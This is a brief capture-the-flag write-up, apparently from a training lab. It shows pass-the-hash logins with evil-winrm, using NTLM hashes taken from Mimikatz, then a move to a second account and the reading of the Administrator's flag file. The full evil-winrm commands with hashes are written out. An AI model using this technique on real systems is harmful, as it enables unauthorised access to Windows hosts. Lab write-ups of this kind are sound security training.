### Recon
First I identify and compile all the hashes from MimiKatz cleanly

### ðŸ“¡ Passing The Hash attempt #1 

I commonly use Evil-winRM especially since I know that these are windows creds. 

After trying a couple of users I then tried ByteReaper

```root@ip-10-10-179-82:~# evil-winrm -u ByteReaper -i 10.10.73.227 -H 43034346035d7a24b1eaa1c82acaef3e```

![winrm success](https://github.com/user-attachments/assets/684f1922-36c6-4465-9d58-2b19418bb383)

Alas I was in! I now knew that the exploit worked and I was on the right path. 
The next logical step was to Check if ByteReaper is already in the Administrators group:
With ```net localgroup administrators```

He was not. Time to pivot!

### Pivot baby one more time

Establishing more attacks I then tried Administrator, Cipher, with no luck â€“ Dark injector finally worked for me.

```evil-winrm -u Darkinjector -i 10.10.73.227 -H 3a659a65d9c16d40a28684995782458f```

From here I navigated to the adminâ€™s desktop and got the flag:

```
cd C:\Users\Administrator\Desktop
ls
type flag.txt
```
